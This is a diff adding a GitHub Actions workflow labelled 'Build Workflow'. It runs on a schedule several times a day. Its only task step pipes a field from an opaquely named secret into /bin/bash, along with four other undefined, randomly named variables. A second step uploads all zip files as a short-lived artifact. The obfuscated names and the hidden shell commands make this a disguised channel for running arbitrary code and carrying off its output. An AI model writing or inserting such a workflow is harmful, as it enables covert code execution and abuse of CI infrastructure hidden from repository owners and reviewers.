@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          xrdu502: ${{ secrets.xrdu502 }}
+        run: |
+          printf '%s' "$xrdu502" | jq -r .rctz2 | /bin/bash
+          echo $myf91096 | jq -r .k9094 | /bin/bash
+          printf '%s' "$rq3" | jq -r .c011 | /bin/bash
+          echo $kdkun1055 | jq -r .iun69531 | /bin/bash
+          echo $u8106 | jq -r .a41 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: 71padyhe
+          path: "*.zip"
+          retention-days: 1
